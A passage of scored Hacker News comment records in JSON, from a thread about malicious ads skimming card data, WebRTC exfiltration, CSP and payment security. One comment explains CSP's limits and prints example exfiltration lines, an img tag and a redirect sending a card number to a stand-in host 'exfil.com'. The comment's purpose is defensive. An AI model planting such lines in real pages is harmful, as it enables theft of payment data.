these 3rd party apps that can switch hands and add malware.\n\nShopify tightened its App Store and even made it harder to install custom apps because of this very issue. My solution is to just ship an agent with each SaaS and it can ask it to add any feature. Maybe my App Store will just be skill files you feed to your agent."}, {"id": 50675188, "au": "xp84", "dom": 131, "sr": 31, "sc": 4.37, "ep": 4.81, "bs": 0.0, "d": 4, "age": 10.29, "grav": 91.5, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 109, "qw": 0, "k": 10133, "kpp": 2.2, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "block_malware", "flbl": "Block & Malware (Crimes)", "urls": [], "ig": 1.651, "fa": 0.0, "gp": 0.639, "bl": 0.0, "ds": 0.0, "txt": "A decent blocker definitely kills sponsored Google results doesn’t it?\n\nBut anyway this is usually seen on sites like Sourceforge and such where they place a giant ad above the small download link, and advertisers completely coincidentally have an “ad” that is a big green “Download” button with no explanation. If Google had even a shred of morality or decency, an ad which is inarguably deceptive should never be accepted to be an ad in the first place. Now they have AI that could trivially answer “is this banner designed in such a way as to be mistaken as other UI the user might find on a webpage?” But of course they don’t use it."}, {"id": 50670401, "au": "IgorPartola", "dom": 118, "sr": 32, "sc": 4.35, "ep": 5.67, "bs": 0.0, "d": 1, "age": 21.57, "grav": 295.4, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 171, "qw": 0, "k": 22237, "kpp": 3.3, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "ads_site", "flbl": "Ads & Site (Javascript)", "urls": [], "ig": 1.728, "fa": 0.0, "gp": 1.11, "bl": 0.0, "ds": 0.0, "txt": "How would you handle items with customization such as custom engravings? This would be both simple customizations as well as things requiring a full graphic or 3d editor? Previews of your items? How avoid discounts based on item combinations that are store-specific? Is your browser smart enough to do complex searches and filters for things like photo gear where some values have ranges? What will your browser do for builders such as putting together kits of equipment or supplies that may or may not all go together?\n\nLike yes designing a generalized shopping experience is possible. It is also going to limit the long tail of features OR become such a huge and bloated spec that it will make things way worse. Imagine Temu but for all the shops.\n\nBesides, doesn’t your browser and OS come from some third party? How much do you trust them to be bug and backdoor free? Or do you have your own browser and OS that you know for sure can do all this and you have verified?"}, {"id": 50669584, "au": "gib444", "dom": 270, "sr": 33, "sc": 4.32, "ep": 5.56, "bs": 0.0, "d": 2, "age": 22.71, "grav": 321.5, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 79, "qw": 51, "k": 666, "kpp": 0.5, "td": 0.0, "mod": 0, "pp": 3, "meme": 0, "tier": "grounded_analysis", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.515, "fa": 0.42, "gp": 0.557, "bl": 0.0, "ds": 0.0, "txt": "> because they usually looked like crap web sites bad guys would knock together, suspicious DNS names, poor site design, vague wording - it was like somebody attended a conference talk which said \"High quality does not mean it's legitimate\" and their take away was \"Do a terrible job and that will seem authentic somehow\".\n\nTotally agree! I love me some 'www4.argot4.pci-barclays.com' .. not !\n\nBut it was more feeling it was still better than the alternative overall.\n\n(While we're ranting: my bank's OTP page has tiny, crap fonts and badly sized inputs. It's inexplicable and I shake my head every time. Probably the same idiots who did the payment pages! They're an amazing bank in every other regard, so I don't think they have much control over it - probably it's VISA or something.)"}, {"id": 50670730, "au": "__MatrixMan__", "dom": 105, "sr": 34, "sc": 4.19, "ep": 5.73, "bs": 0.0, "d": 2, "age": 21.04, "grav": 283.4, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 150, "qw": 0, "k": 10035, "kpp": 2.0, "td": 0.0, "mod": 0, "pp": 3, "meme": 0, "tier": "grounded_analysis", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.658, "fa": 0.28, "gp": 0.714, "bl": 0.0, "ds": 0.0, "txt": "Yeah I think there's quite a lot of craziness to go around.  It's dumb on so many levels.  To zoom out a bit further, It's also crazy that I can get a business loan for some endeavor that would hurt somebody, and then take the money from that loan, and expect that person to value that money--fungibility obfuscates moral hazards and makes us work against our own interests, and I'd love to do away with it also.\n\nBut whether or not we agree about how we might restructure the bigger picture, at some point somebody has to say yes or no to a candidate transaction, somebody whose answer makes it a real transaction.  It seems very obvious to me that:\n\n1. that person should be a party to the transaction, not a middle man\n\n2. The secret they use to do so should not leave their device. (A modern credit card is a device, complete with an OS and a secure enclave for keys)"}, {"id": 50669501, "au": "nout", "dom": 248, "sr": 35, "sc": 4.11, "ep": 5.21, "bs": 0.0, "d": 0, "age": 22.86, "grav": 324.9, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 82, "qw": 0, "k": 561, "kpp": 2.6, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.446, "fa": 0.0, "gp": 1.25, "bl": 0.0, "ds": 0.0, "txt": "This is where architecturally credit cards are bad for online (and even meatlife) purchases. \nIf the same \"numbers\" can be used again for another purchase, then skimming is just bound to happen. There are ways to mitigate with one time use cards, but generally this just works better with Bitcoin. \nE.g. when I'm paying at the Square terminals and use bitcoin, they can't \"store\" my information to pay again. Or when I'm buying stuff online, it's also only generating code/invoice for that specific purchase."}, {"id": 50678607, "au": "__MatrixMan__", "dom": 82, "sr": 36, "sc": 4.1, "ep": 4.98, "bs": 0.0, "d": 6, "age": 1.06, "grav": 7.5, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 64, "qw": 0, "k": 10035, "kpp": 2.0, "td": 0.0, "mod": 0, "pp": 3, "meme": 0, "tier": "grounded_analysis", "facet": "companies_liable", "flbl": "Companies & Liable (User)", "urls": [], "ig": 1.314, "fa": 0.34, "gp": 0.64, "bl": 0.0, "ds": 0.0, "txt": "Right, the credit card companies enjoy their position as gatekeeper. They're able to extract more than they lose, so they cut the customer in on their profits. Which is... Nice? But we still end up having to tolerate the problems associated with unnecessary middlemen who find other ways to extract value from their position.  I don't think its worth the 2% we're getting paid."}, {"id": 50671080, "au": "godwinson__4-8", "dom": 172, "sr": 37, "sc": 4.02, "ep": 5.56, "bs": 0.0, "d": 3, "age": 20.41, "grav": 269.7, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 197, "qw": 0, "k": 538, "kpp": 1.4, "td": 0.0, "mod": 0, "pp": 3, "meme": 0, "tier": "grounded_analysis", "facet": "ads_site", "flbl": "Ads & Site (Javascript)", "urls": [], "ig": 1.557, "fa": 0.34, "gp": 0.64, "bl": 0.0, "ds": 0.0, "txt": "I find JS my AI writes more trustworthy than JS someone else (likely also an AI at this point) writes.\n\nWhy this would be controversial I don't know. It would iterate on results. AI is fairly reliable for simple tasks at this point. Most front ends fall well within this category. The problem with software is the misaligned incentives, not AI hallucinations. When it comes to prompt injection attacks, that will have to be engineered around, just as the browser already engineers around a whole suite of dangers before any JavaScript ever runs.\n\nBut we have to get to the point first where the adversarial incentives are eliminated. The fundamental tension is not technical at all, but political - no one wants to pay for anything, rent seeking behaviors are encouraged. Everyone wants ease and expects someone else to pay the cost. Meanwhile a handful of people whose behavior resembles that of sociopaths horde wealth derived from the commons.\n\nInstead of a 2028 backlash that seeks to demonize AI the correct answer would be changing the economic model so that rather than becoming an even more insidious ad delivery mechanism it ends the prevailing model entirely, which is not desirable to begin with anyway."}, {"id": 50670570, "au": "kragen", "dom": 257, "sr": 38, "sc": 4.0, "ep": 4.88, "bs": 0.0, "d": 0, "age": 21.31, "grav": 289.4, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 69, "qw": 0, "k": 39432, "kpp": 2.0, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "browsers_etc", "flbl": "Browsers & Etc (Ads)", "urls": [], "ig": 1.724, "fa": 0.0, "gp": 0.575, "bl": 0.0, "ds": 0.0, "txt": "I was surprised to learn recently that browsers support iframe attributes to prevent almost all of the possible ways an iframe can exfiltrate information—navigating the iframe, navigating the top frame, loading images, loading scripts, using Fetch or XHR, etc.—but not WebRTC.  In this case, though, it looks like the ads had lots of exfiltration avenues available, so I wonder why they went to the extra trouble of using WebRTC?"}, {"id": 50669031, "au": "0xmattf", "dom": 282, "sr": 39, "sc": 3.95, "ep": 5.05, "bs": 0.0, "d": 0, "age": 23.48, "grav": 339.7, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 31, "qw": 0, "k": 96, "kpp": 1.4, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "ads_site", "flbl": "Ads & Site (Javascript)", "urls": [], "ig": 1.393, "fa": 0.34, "gp": 0.561, "bl": 0.0, "ds": 0.0, "txt": "I'm honestly stumped. I checked the homepage of InfoHawk, and see a one-shot prompt to Claude landing page. Then I googled InfoHawk, and see they raised $2.25 million. Impressive.\n\nI really want to redesign their landing page."}, {"id": 50672090, "au": "lxgr", "dom": 95, "sr": 40, "sc": 3.95, "ep": 5.5, "bs": 0.0, "d": 2, "age": 18.52, "grav": 230.2, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 170, "qw": 0, "k": 22198, "kpp": 2.2, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.985, "fa": 0.0, "gp": 0.573, "bl": 0.0, "ds": 0.0, "txt": "You probably mean cardholder authentication, not authorization. Authorization in the cards space means checking with the card issuer if the card has sufficient funds, but the cardholder identity is usually not verified here (except if maybe a PIN is entered, but even that can happen at a different stage). Even magnetic stripe cards have been commonly authorized online decades before EMV became a thing.\n\nAlso, the idea that \"better EMV cards yield better security\" is outdated by at least a decade and was only really relevant before ubiquitous online transaction authorization (at which point both \"cheap\" and \"expensive\" EMV cards can be verified for being clones). These days, essentially all cards support asymmetric cryptography, i.e. are the \"expensive type of card\", and are secure against clones even when the terminal is offline (assuming the issuer even wants to support that type of transaction, since it involves some risk to them).\n\nThe main difference is whether they support a PIN or whether a signature is sufficient, but that's mainly driven by market considerations, not individual issuers' fraud tradeoffs."}, {"id": 50669687, "au": "thaumasiotes", "dom": 84, "sr": 41, "sc": 3.84, "ep": 5.38, "bs": 0.0, "d": 2, "age": 22.55, "grav": 317.7, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 131, "qw": 0, "k": 24800, "kpp": 1.2, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.568, "fa": 0.34, "gp": 0.499, "bl": 0.0, "ds": 0.0, "txt": "I have had that happen (two relevant banks: Bank of America / Capital One), but it's very rare. The normal case is that you put in your card information and you're done.\n\nLong ago, I had payment denied for an in-person transaction, after which my card was locked for any purpose, and I had to make a phone call to Bank of America to (1) process the original transaction and (2) unlock my card. The in-person transaction was in China, which I guess freaked out their system.\n\nBut having done that once, I never had a problem in China again. I opened the Capital One account mainly so that I could use it in China (\"no foreign transaction fee\", though in fact the foreign transaction fee is a very reliable 1%), and it didn't even raise an objection the first time like BofA did."}, {"id": 50670479, "au": "BobbyTables2", "dom": 204, "sr": 42, "sc": 3.83, "ep": 4.93, "bs": 0.0, "d": 3, "age": 21.46, "grav": 292.9, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 54, "qw": 0, "k": 2660, "kpp": 1.6, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "companies_liable", "flbl": "Companies & Liable (User)", "urls": [], "ig": 1.736, "fa": 0.0, "gp": 0.586, "bl": 0.0, "ds": 0.0, "txt": "Sure seems like in any other context, there would be liability.\n\nWe just never moved past the 1980s mindset of computers being mysterious black boxes.\n\nImagine if pharmaceutical companies knowingly purchased ingredients from suppliers that were known to randomly include toxic materials in their product.\n\nWould we hold everyone in the chain completely blameless?"}, {"id": 50668615, "au": "afavour", "dom": 272, "sr": 43, "sc": 3.78, "ep": 5.02, "bs": 0.0, "d": 1, "age": 24.11, "grav": 355.0, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 39, "qw": 0, "k": 30881, "kpp": 6.1, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "browsers_etc", "flbl": "Browsers & Etc (Ads)", "urls": [], "ig": 1.359, "fa": 0.0, "gp": 1.262, "bl": 0.0, "ds": 0.0, "txt": "IMO likely simply that automated testing runs on desktop browsers far more often. Plus dev tools is way more accessible on desktop. If you hide it there the devs working on the site are much less likely to notice."}, {"id": 50676595, "au": "hobo123", "dom": 1, "sr": 44, "sc": 3.75, "ep": 4.85, "bs": 0.0, "d": 0, "age": 5.12, "grav": 34.2, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 55, "qw": 0, "k": 379, "kpp": 0.8, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "browsers_etc", "flbl": "Browsers & Etc (Ads)", "urls": [], "ig": 1.377, "fa": 0.0, "gp": 1.112, "bl": 0.0, "ds": 0.0, "txt": "Man, browsers really need to lock down less often required technologies by default and ask users to unlock them.\n\nThere's no reason a non-conferencing site should need webrtc, so it should only be available if asked for. Probably same for many other technologies that trade security for convenience, or bring desktop integration tech into web browsers."}, {"id": 50673062, "au": "Fnoord", "dom": 193, "sr": 45, "sc": 3.71, "ep": 5.25, "bs": 0.0, "d": 4, "age": 16.13, "grav": 184.2, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 135, "qw": 10, "k": 9392, "kpp": 1.4, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "ads_site", "flbl": "Ads & Site (Javascript)", "urls": [], "ig": 1.311, "fa": 0.42, "gp": 0.67, "bl": 0.0, "ds": 0.0, "txt": "> There is no other way. Ad buyers don't trust you [...]\n\nYou actually described the other way perfectly fine, and when I grew up, this was the way the WWW functioned. There were actually annoying, flashing ads back then, too, but I mean this was the dotcom boom baby, the sky was the limit. Then came a company which went back to the old way: they came with text ads. That company is now one of the largest in the world. There absolutely is another way, but it requires some trust by advertisers, and as long as they don't want such, we'll get this one where they have free rein over websites while they should not have such power. Because they have proven over, and over, and over again they cannot keep such power responsively. So what do you do then as responsible site owner? You demote them."}, {"id": 50677113, "au": "honeybadger1", "dom": 18, "sr": 46, "sc": 3.67, "ep": 5.21, "bs": 0.0, "d": 3, "age": 3.61, "grav": 22.3, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 126, "qw": 0, "k": 105, "kpp": 0.3, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.99, "fa": 0.0, "gp": 0.368, "bl": 0.0, "ds": 0.0, "txt": "I would only be surprised if I didn't see unrealistic comments on HN when it comes to technology usage by the masses.\n\nThe average mind here is living in a tech-bubble surrounded by tech-bubble living friends. Some don't understand the normies way of life basically thinks of mobile technology like any other simple commodity product, but is required to live a normal 1st/2nd world life. A refrigerator, a washer and dryer, etc...\n\nAs much as it pains me to say, this feat of handing highly advanced and equally dangerous mobile technology to normal people at mass is mainly because of Apples approach to designing advanced technology. Simple as possible that a child or senior can pick it up and use it within minutes to a day without any professional training in most cases."}, {"id": 50669660, "au": "jszymborski", "dom": 212, "sr": 47, "sc": 3.62, "ep": 4.28, "bs": 0.0, "d": 2, "age": 22.59, "grav": 318.6, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 70, "qw": 0, "k": 10195, "kpp": 3.4, "td": 0.0, "mod": 0, "pp": 3, "meme": 0, "tier": "grounded_analysis", "facet": "block_malware", "flbl": "Block & Malware (Crimes)", "urls": [], "ig": 1.62, "fa": 0.0, "gp": 0.326, "bl": 0.0, "ds": 0.0, "txt": "If door-to-door sales people were disproportionately committing crimes that would be a good analogy, but it's just not the case.\n\nWe all have our threat models, but I can guarantee you that simply installing uBlock Origin on a non-technical persons' PC will go much, much further than install an anti-virus towards securing their PC.\n\nAnd FWIW I do use NoScript to block all third party scripts (and I used to block first party scripts)."}, {"id": 50675803, "au": "KellyCriterion", "dom": 133, "sr": 48, "sc": 3.58, "ep": 5.13, "bs": 0.0, "d": 2, "age": 8.0, "grav": 63.0, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 109, "qw": 0, "k": 1096, "kpp": 0.9, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "browsers_etc", "flbl": "Browsers & Etc (Ads)", "urls": [], "ig": 1.853, "fa": 0.0, "gp": 0.532, "bl": 0.0, "ds": 0.0, "txt": "OT:\n\nIn an earlier company, one of the C-level guys got a new notebook, it was more or less naked, only with MS Word etc. - the guy was used to a distinct Browser Extension that he used on the old notebook and also at home.\n\nSince this extension was missing, he tried to download it from the internet - unfortunately, Google search send him to a compromised malware version of that plugin, instead of the original website.\n\nHe was close to loose around 500k for the company as his notebook got infiltrated due to a phishing attack, only his other colleague (the second four-eye-pair) was curious enough to investigate before transferring the money."}, {"id": 50668888, "au": "__MatrixMan__", "dom": 38, "sr": 49, "sc": 3.52, "ep": 5.06, "bs": 0.0, "d": 0, "age": 23.7, "grav": 345.1, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 54, "qw": 0, "k": 10035, "kpp": 2.0, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.271, "fa": 0.0, "gp": 1.43, "bl": 0.0, "ds": 0.0, "txt": "It's crazy that we have had asymmetric cryptography since the 70s and we're still using symmetric secrets for payment.\n\nI suspect that the people who could change this are more interested in continued treatment than cure. They like being the arbiters of which transactions get reversed. It let's them justify their otherwise parasitic position."}, {"id": 50676942, "au": "hobo123", "dom": 116, "sr": 50, "sc": 3.43, "ep": 4.97, "bs": 0.0, "d": 2, "age": 4.06, "grav": 25.6, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 57, "qw": 0, "k": 379, "kpp": 0.8, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "browsers_etc", "flbl": "Browsers & Etc (Ads)", "urls": [], "ig": 1.709, "fa": 0.0, "gp": 0.658, "bl": 0.0, "ds": 0.0, "txt": "But why should all content come with a turing complete language inside? That's a security risk waiting to happen (plus battery drain on your side).\n\nPDFs are (usually) static pages in a fixed paper format, so they should only display stuff, not do calculations. Same for most web content anyone ever wants to visit (excluding games, demos, actual apps, etc)."}, {"id": 50671299, "au": "kevsamuel", "dom": 239, "sr": 51, "sc": 3.4, "ep": 4.5, "bs": 0.0, "d": 0, "age": 20.09, "grav": 262.8, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 63, "qw": 0, "k": 89, "kpp": 2.8, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "ads_site", "flbl": "Ads & Site (Javascript)", "urls": [], "ig": 1.462, "fa": 0.0, "gp": 0.733, "bl": 0.0, "ds": 0.0, "txt": "I don't see what this has anything to do with Web RTC, a normal ajax requests would have worked if the server define CORS, and even without, you can push a POST form button cross domains anyway.\n\nUnless the site just forgot to add Web RTC in their connect-src CSP?\n\nIn which case it's not about WebRTC, it's about the site owner not securing their website."}, {"id": 50675494, "au": "rebeccapowell", "dom": 268, "sr": 52, "sc": 3.35, "ep": 4.75, "bs": 0.0, "d": 1, "age": 9.17, "grav": 77.0, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 92, "qw": 0, "k": 112, "kpp": 7.5, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.43, "fa": 0.28, "gp": 0.406, "bl": 0.0, "ds": 0.0, "txt": "Worse are the ones on mobile that do things like embed PayPal into the web view. Dominos in Germany is a good example. You have no idea if you are logging into PayPal or just giving your PayPal credentials to Dominos.\n\nSince they did that I pay by credit card physically when they deliver, which means they have to bring the card reader with them.\n\nWorse still, they used to do this right and then changed it. They also used to offer Apple Pay and then removed it as a payment option. Talk about regression."}, {"id": 50675012, "au": "akoboldfrying", "dom": 156, "sr": 53, "sc": 3.3, "ep": 4.84, "bs": 0.0, "d": 3, "age": 11.03, "grav": 101.6, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 121, "qw": 0, "k": 2090, "kpp": 1.4, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "ads_site", "flbl": "Ads & Site (Javascript)", "urls": [], "ig": 1.705, "fa": 0.0, "gp": 0.575, "bl": 0.0, "ds": 0.0, "txt": "I'll put my hand up and say, yes, blocking ads is essentially theft with respect to its impact on the hosting site. That is: the reason theft as traditionally understood (taking a physical item) is bad for the good seller is the same reason why blocking ads is bad for the site host.\n\nThis is not in any way an endorsement of ads that do illegal things like stealing credit card numbers, which obviously remain illegal and should be punished appropriately. It shouldn't even be necessary to say this, but I sense in this thread and others a willingness to conflate the legitimate evil of ads that plainly break the law with the mere annoyingness of having to watch regular law-abiding ads at all."}, {"id": 50675393, "au": "__MatrixMan__", "dom": 41, "sr": 54, "sc": 3.3, "ep": 4.84, "bs": 0.0, "d": 3, "age": 9.5, "grav": 81.1, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 125, "qw": 0, "k": 10035, "kpp": 2.0, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.804, "fa": 0.0, "gp": 0.413, "bl": 0.0, "ds": 0.0, "txt": "Asymmetric cryptography is already in widespread use for authenticating transactions which involved a card communicating with the terminal via chip or NFC. Has been for a long time. Works great. No need to involve a blockchain.\n\nAll we have to do is disable the ability to make payments in a way that ignores those protections (i.e. by copying numbers printed on the card into a text box). And then add enough NFC readers in the right places so that nobody is left out by no longer having the ability to pay via manually copying numbers.\n\nWe could find a way to preserve the ability to pay by email or some other text medium, but what gets passed around is a digital signature, not a symmetric key, so there's no incentive to secretly make a copy."}, {"id": 50677419, "au": "c0nrad", "dom": 21, "sr": 55, "sc": 3.26, "ep": 8.16, "bs": 3.58, "d": 2, "age": 3.03, "grav": 18.3, "surf": 18.3, "fade": "c00", "dt": 0, "ut": 1, "lu": 1, "w": 166, "qw": 0, "k": 125, "kpp": 1.6, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "companies_liable", "flbl": "Companies & Liable (User)", "urls": ["https://exfil.com?cc=1234", "https://www.youtube.com/watch?v=sAmJ3Ypbosw"], "ig": 2.143, "fa": 0.9, "gp": 0.388, "bl": 1.35, "ds": 0.0, "txt": "Not particularly. CSP is good at preventing execution (XSS), but once there is execution it's not the best at preventing exfiltration.\n\nIf an attacker is able to inject/modify an existing script file (or add allowed script files for ads), CSP can't help (unless you're using hashes, but those can be brittle).\n\nPreventing exfil is very hard with CSP. Any \"real world\" policy will have need to require open'ish directives (img-src https:, etc), which will allow trivial exfil (<img src='https://exil.com?cc=1234'<\/>). Redirects (window.location = \"https://exfil.com?cc=1234\") also go around CSP. There's many CTF challenges related to these bypasses.\n\nWebRTC is particularly difficult to stop too, and the webrtc directive isn't widely adopted yet. It's commonly used as a global CSP bypass since it doens't call under connect-src (and can't).\n* https://www.youtube.com/watch?v=sAmJ3Ypbosw\n\nSo this needs to be stopped at the injection point.\n\n(edit: I guess one could argue for monitoring with report-hash, but it seems unlikey for companies to detect and read every change to 3rd party scripts).\n\n(Founder of csper.io)"}, {"id": 50669190, "au": "techjamie", "dom": 181, "sr": 56, "sc": 3.26, "ep": 4.53, "bs": 0.0, "d": 1, "age": 23.27, "grav": 334.7, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 46, "qw": 0, "k": 776, "kpp": 2.2, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "companies_liable", "flbl": "Companies & Liable (User)", "urls": [], "ig": 1.406, "fa": 0.0, "gp": 0.841, "bl": 0.0, "ds": 0.0, "txt": "It amazes me that ad companies are allowed to let anyone with a few dollars shove arbitrary JavaScript/assets down the throats of the wider internet. Not only that, but the operators are financially incentivized to allow malvertising to continue operating because they're amazing repeat customers."}, {"id": 50670924, "au": "Groxx", "dom": 119, "sr": 57, "sc": 3.26, "ep": 4.45, "bs": 0.0, "d": 2, "age": 20.67, "grav": 275.4, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 62, "qw": 0, "k": 21177, "kpp": 2.4, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "ads_site", "flbl": "Ads & Site (Javascript)", "urls": [], "ig": 1.306, "fa": 0.0, "gp": 0.954, "bl": 0.0, "ds": 0.0, "txt": "With an exception for thing-editors that are not built into the browser (but could be, e.g. text is built in), all of those are rather easily covered by \"the server sends that information\".  E.g. add something to your cart -> that loads the next page which has updated discount availability.\n\nThey weren't saying websites should be completely static, just maybe they shouldn't run attacker-controlled code."}, {"id": 50668758, "au": "gib444", "dom": 267, "sr": 58, "sc": 3.26, "ep": 4.13, "bs": 0.0, "d": 0, "age": 23.9, "grav": 349.9, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 37, "qw": 0, "k": 666, "kpp": 0.5, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.385, "fa": 0.0, "gp": 0.604, "bl": 0.0, "ds": 0.0, "txt": "I've never liked those in-page credit card forms, and always preferred redirects to payment-provider hosted pages.\n\nI'm guessing conversion is higher when there is no redirect flow, so the sales team won the battle with the security teams?"}, {"id": 50670699, "au": "WarmWash", "dom": 207, "sr": 59, "sc": 3.26, "ep": 4.12, "bs": 0.0, "d": 2, "age": 21.09, "grav": 284.5, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 99, "qw": 0, "k": 6019, "kpp": 2.5, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "grounded_analysis", "facet": "block_malware", "flbl": "Block & Malware (Crimes)", "urls": [], "ig": 1.309, "fa": 0.34, "gp": 0.049, "bl": 0.0, "ds": 0.0, "txt": "Ironically this is only true for people who use privacy tools (or have a penchant for clicking on scammy ads).\n\nAt auction it's only the sleeziest bidders who bid on blank profiles.\n\nThis is why when you turn off ad-block to \"see what it's like\" it's all the worst stuff. Nobody wants to pay to show you their ad, they already know you don't look at ads.\n\nGoogle doesn't care much either because they too know you don't do ads. So they'll take the $0.00001 and  not worry much about how the internet looks for people using ad block anyway."}, {"id": 50668990, "au": "mzmzmzm", "dom": 279, "sr": 60, "sc": 3.26, "ep": 4.08, "bs": 0.0, "d": 0, "age": 23.53, "grav": 341.0, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 40, "qw": 0, "k": 453, "kpp": 5.7, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "browsers_etc", "flbl": "Browsers & Etc (Ads)", "urls": [], "ig": 1.442, "fa": 0.0, "gp": 0.473, "bl": 0.0, "ds": 0.0, "txt": "Sadly the web is unusable without ad blockers, in terms of usability, accessibility, and clearly security as well. Things that make content blocking harder (iOS locking down the browser engine, manifest v3, cloudflare turnstile, etc) are often just punishing users."}, {"id": 50675816, "au": "KellyCriterion", "dom": 208, "sr": 61, "sc": 3.26, "ep": 4.04, "bs": 0.0, "d": 3, "age": 7.94, "grav": 62.4, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 58, "qw": 0, "k": 1096, "kpp": 0.9, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "block_malware", "flbl": "Block & Malware (Crimes)", "urls": [], "ig": 1.309, "fa": 0.34, "gp": 0.0, "bl": 0.0, "ds": 0.0, "txt": "But wouldnt this lead in the longer run to a constantly decaying search/ad revenue, since number of people & screenstime is limited? If you would have unlimited traffic, even 0.00001 may be enought to survive on a distinct scale/size.\n\nLast earnings call \"search\" wasnt mentioned that often as AI, if I remember correctly: So they search business may die already slowly."}, {"id": 50671946, "au": "sam1714", "dom": 81, "sr": 62, "sc": 3.26, "ep": 3.96, "bs": 0.0, "d": 5, "age": 18.84, "grav": 236.6, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 1, "lu": 0, "w": 18, "qw": 0, "k": 209, "kpp": 2.5, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": ["https://www.kansascityfed.org/research/payments-system-research-briefings/new-data-on-card-present-and-card-not-present-fraud-rates-in-the-united-states/"], "ig": 0.86, "fa": 0.68, "gp": 0.0, "bl": 0.0, "ds": 0.0, "txt": "US card not present fraud is around 23 basis points (0.23%) [1]. Compare that to credit card cash-back rewards at 1-2%.\n\n[1] https://www.kansascityfed.org/research/payments-system-resea..."}, {"id": 50669853, "au": 